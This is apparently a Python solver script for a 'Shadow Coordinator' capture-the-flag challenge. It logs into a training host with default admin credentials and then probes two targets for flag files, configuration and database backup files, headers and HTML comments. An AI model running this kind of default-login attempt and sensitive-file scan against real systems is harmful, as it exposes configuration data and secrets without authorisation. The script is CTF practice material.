#!/usr/bin/env python3
"""
Direct flag search for Shadow Coordinator CTF
Try common flag locations and patterns
"""
import requests
import json
import re

def direct_flag_search():
    """Search for flag in common locations"""
    session = requests.Session()
    session.verify = False

    # Both targets
    targets = [
        "https://training.my-ctf.com:8812",
        "http://training-pod2.ctfchile.com:32780"
    ]

    # Login
    login_url = "http://training-pod2.ctfchile.com:32780/api/v2/auth/login"
    resp = session.post(login_url, json={"username": "admin", "password": "admin1234"})
    token = resp.json()["access_token"]
    session.headers.update({
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    })

    print(f"[+] Authenticated")

    # Common flag file locations
    flag_files = [
        "/flag.txt",
        "/flag",
        "/flag.flag",
        "/ctf.txt",
        "/shadow_coordinator_flag.txt",
        "/coordinator_flag.txt",
        "/root/flag.txt",
        "/home/flag.txt",
        "/tmp/flag.txt",
        "/var/flag.txt",
        "/opt/flag.txt",
        "/.flag",
        "/FLAG",
        "/Flag.txt",
        "/secrets.txt",
        "/key.txt",
        "/token.txt"
    ]

    # Test each target
    for base_url in targets:
        print(f"\n[*] Testing {base_url}")

        # Test direct flag files
        for flag_file in flag_files:
            try:
                resp = session.get(f"{base_url}{flag_file}")
                if resp.status_code == 200 and resp.text.strip():
                    content = resp.text.strip()
                    if content != '<!DOCTYPE html>' and len(content) < 200:
                        print(f"[+] {flag_file}: {content}")

                        # Check for flag pattern
                        if re.search(r'(flag\{[^}]+\}|ctf\{[^}]+\})', content, re.IGNORECASE):
                            print(f"[!!!] FLAG FOUND: {content}")
                            return content
            except:
                pass

        # Test robots.txt and common files
        common_files = [
            "/robots.txt",
            "/sitemap.xml",
            "/.htaccess",
            "/web.config",
            "/config.ini",
            "/config.json",
            "/settings.json",
            "/app.config",
            "/README.txt",
            "/TODO.txt",
            "/NOTES.txt",
            "/backup.sql",
            "/database.sql"
        ]

        for file_path in common_files:
            try:
                resp = session.get(f"{base_url}{file_path}")
                if resp.status_code == 200 and resp.text.strip():
                    content = resp.text.strip()
                    print(f"[+] {file_path}: {content[:100]}...")

                    if re.search(r'(flag\{[^}]+\}|ctf\{[^}]+\})', content, re.IGNORECASE):
                        print(f"[!!!] FLAG IN {file_path}: {content}")
                        return content
            except:
                pass

    # Test HTTP headers for flags
    print(f"\n[*] Checking HTTP headers...")
    for base_url in targets:
        try:
            resp = session.get(f"{base_url}/")
            for header, value in resp.headers.items():
                if re.search(r'(flag\{[^}]+\}|ctf\{[^}]+\})', value, re.IGNORECASE):
                    print(f"[!!!] FLAG IN HEADER {header}: {value}")
                    return value

                if any(keyword in header.lower() for keyword in ['flag', 'ctf', 'shadow', 'coordinator']):
                    print(f"[+] Interesting header {header}: {value}")
        except:
            pass

    # Test source code comments
    print(f"\n[*] Checking source code...")
    for base_url in targets:
        try:
            resp = session.get(f"{base_url}/")
            content = resp.text

            # Look for HTML comments with flags
            comments = re.findall(r'<!--(.*?)-->', content, re.DOTALL)
            for comment in comments:
                if re.search(r'(flag\{[^}]+\}|ctf\{[^}]+\})', comment, re.IGNORECASE):
                    print(f"[!!!] FLAG IN COMMENT: {comment.strip()}")
                    return comment.strip()

                if any(keyword in comment.lower() for keyword in ['flag', 'ctf', 'shadow', 'coordinator']):
                    print(f"[+] Interesting comment: {comment.strip()[:100]}")

            # Look for script variables with flags
            script_matches = re.findall(r'var\s+\w+\s*=\s*["\'][^"\']*(?:flag|ctf)[^"\']*["\']', content, re.IGNORECASE)
            for match in script_matches:
                print(f"[+] Script variable: {match}")
                if re.search(r'(flag\{[^}]+\}|ctf\{[^}]+\})', match, re.IGNORECASE):
                    flag_match = re.search(r'(flag\{[^}]+\}|ctf\{[^}]+\})', match, re.IGNORECASE)
                    if flag_match:
                        print(f"[!!!] FLAG IN SCRIPT: {flag_match.group(1)}")
                        return flag_match.group(1)

        except:
            pass

    # Test base64 encoded flags in cookies/localStorage simulation
    print(f"\n[*] Testing encoded flag patterns...")

    # Test some common encoded flag formats
    encoded_tests = [
        "ZmxhZ3tzaGFkb3dfY29vcmRpbmF0b3J9",  # base64 encoded test
        "flag%7Bshadow_coordinator%7D",  # URL encoded
        "flag&123;shadow_coordinator&125;",  # HTML encoded
    ]

    for encoded in encoded_tests:
        try:
            import base64
            if encoded.startswith("ZmxhZ"):
                decoded = base64.b64decode(encoded + "===").decode('utf-8', errors='ignore')
                if re.search(r'(flag\{[^}]+\}|ctf\{[^}]+\})', decoded, re.IGNORECASE):
                    print(f"[!!!] DECODED FLAG: {decoded}")
                    return decoded
        except:
            pass

    return None

if __name__ == "__main__":
    flag = direct_flag_search()
    if flag:
        print(f"\n🎉 [SUCCESS] FLAG: {flag}")
    else:
        print(f"\n[INFO] No flag found in direct search")